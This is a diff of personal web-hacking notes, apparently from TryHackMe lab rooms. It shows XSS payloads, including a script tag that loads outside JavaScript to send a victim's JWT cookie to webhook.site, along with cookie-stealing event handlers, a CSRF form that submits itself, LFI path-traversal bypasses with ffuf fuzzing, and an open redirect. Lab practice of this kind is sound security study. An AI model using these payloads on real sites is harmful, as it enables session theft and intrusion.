@@ -25,7 +25,7 @@ In website name (using safe)
 <script src = "https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project2.js"></script>
 
 https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project2.js > webhook.site > get cookie(JWT token) > Decrypt and get cookie.
-______________________________________________________________________________________________________________________________________________
+____________________________________________________________________________________________________________________________________________
 In admin.html
 <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
 
@@ -70,6 +70,8 @@ To do LFI there may be another parameter instead of id
 http://10.10.216.223:5000/api/v1/resources/books?show=.bash_history
 
 ____________________________________________________________________________________________________________________________________________
+XSS injection bypassing the filter (&lt and &gt)
+------------------------------------------------
 
 http://nahamstore.thm/search?q=alert(1)
 
@@ -83,7 +85,8 @@ Use payload =>  '; alert(1);'
 ------------------------------
 <h3 class="text-center">Search Results For "'; alert(1);'"</h3>
 __________________________________________________________________________________________________________________________
-
+XSS in User-Agent
+-----------------
 Whenever we make an order, User-Agent is reflected back to client, that means Stored XSS is valid.
 
 for example
@@ -94,7 +97,9 @@ Order Date: 03/03/2024 08:18:17
 User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 
 We can inject malicious javascript code ==>  User-Agent:<script>alert(1)</script>
-__________________________________________________________________________________________________________________________
+__________________________________________________________________________________________________________________________________________
+Puting the additional parameter discount 
+-----------------------------------------
 
 http://nahamstore.thm/product?id=2&added=1 (original)
 
@@ -110,10 +115,13 @@ http://nahamstore.thm/product?id=2&added=1&discount=1234
 
 <div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value="1234"></div>
 
-http://nahamstore.thm/product?id=2&added=1&discount=1234"onmouseover=alert(document.cookie);//"
-  														---------------------------------------
-****When you put your mouse pointer over the box, you will get cookie****
+XSS inject with onmouseover parameter
+-------------------------------------
 
+http://nahamstore.thm/product?id=2&added=1&discount=1234"onmouseover=alert(document.cookie);//"
+  														
+****When you put your mouse pointer over the box, you will get cookie****
+____________________________________________________________________________________________________________________________________________
 Open redirect in login page
 ---------------------------
 
@@ -121,7 +129,7 @@ http://nahamstore.thm/login?redirect_url=order (original)
 
 http://nahamstore.thm/login?redirect_url=https://www.google.com
 When you press the login > it will redirects to google.com.
-______________________________________________________________________________________________________________________________
+____________________________________________________________________________________________________________________________________________
 Use CSRF POC generator to generate form for user input (if csrf token is appeared, delete it)
 --------------------------------------------------------
 for example
@@ -167,7 +175,7 @@ Only sending the html file and automatically click the submit form to change the
 		document.forms[0].submit();
 	</script>
 <html>
-______________________________________________________________________________________________________________________________
+_________________________________________________________________________________________________________________________________________
 LFI filter bypass
 -----------------
 filter -->  ../ 
@@ -179,7 +187,7 @@ In ....// if filter remove ../ another ../ is still hanging on, so we can bypass
 LFI fuzzing with ffuf
 ---------------------
 ffuf -u http://nahamstore.thm/product/picture/?file=FUZZ -w LFI-Jhaddix.txt -fs 19
-_______________________________________________________________________________________________________________________________
+_______________________________________________________________________________________________________________________________________
 SSRF injection (mostly in redirect parameter)
 --------------
 
